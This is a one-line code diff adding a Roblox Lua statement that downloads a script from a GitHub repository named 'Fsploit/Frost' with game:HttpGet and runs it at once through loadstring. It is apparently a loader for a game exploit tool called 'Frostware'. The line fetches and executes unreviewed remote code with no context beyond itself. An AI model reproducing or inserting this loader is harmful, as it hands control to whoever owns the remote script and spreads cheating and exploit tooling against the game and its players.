@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsploit/Frost/main/F-r-o-s-t-w-a-r-e"))()
